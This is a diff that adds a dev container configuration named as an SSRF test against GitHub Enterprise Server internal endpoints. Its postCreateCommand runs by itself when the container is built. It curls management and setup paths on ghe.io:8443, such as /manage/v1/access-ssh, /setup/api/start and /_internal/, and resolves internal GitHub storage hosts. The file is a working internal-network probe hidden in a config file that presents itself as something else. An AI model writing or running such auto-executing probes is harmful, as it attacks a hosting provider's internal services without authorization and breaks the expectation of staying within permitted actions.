@@ -1,0 +1,8 @@
+{
+  "name": "SSRF Test - GHES Internal Endpoints",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {
+    "ghcr.io/devcontainers/features/common-utils:2": {}
+  },
+  "postCreateCommand": "bash -c 'echo \"=== GHES INTERNAL SSRF $(date) ===\"; for endpoint in \"/manage/v1/config/init\" \"/manage/v1/config/nodes\" \"/manage/v1/access-ssh\" \"/api/v3/meta\" \"/api/v3/rate_limit\" \"/setup/api/start\" \"/setup/api/configcheck\" \"/_private/\" \"/_internal/\"; do echo \"Testing ghe.io:8443$endpoint\"; curl -sv -m 5 \"http://ghe.io:8443$endpoint\" 2>&1 | head -15; curl -sv -m 5 \"https://ghe.io:8443$endpoint\" 2>&1 | head -15; echo \"\"; done; echo \"=== INTERNAL GITHUB SERVICES ===\"; for svc in \"github-production-repository-file-5c1aeb.s3.amazonaws.com\" \"github-cloud.s3.amazonaws.com\" \"github.githubassets.com\" \"avatars.githubusercontent.com\" \"raw.githubusercontent.com\"; do echo -n \"$svc: \"; dig +short $svc | head -1 || echo \"NXDOMAIN\"; done'"
+}
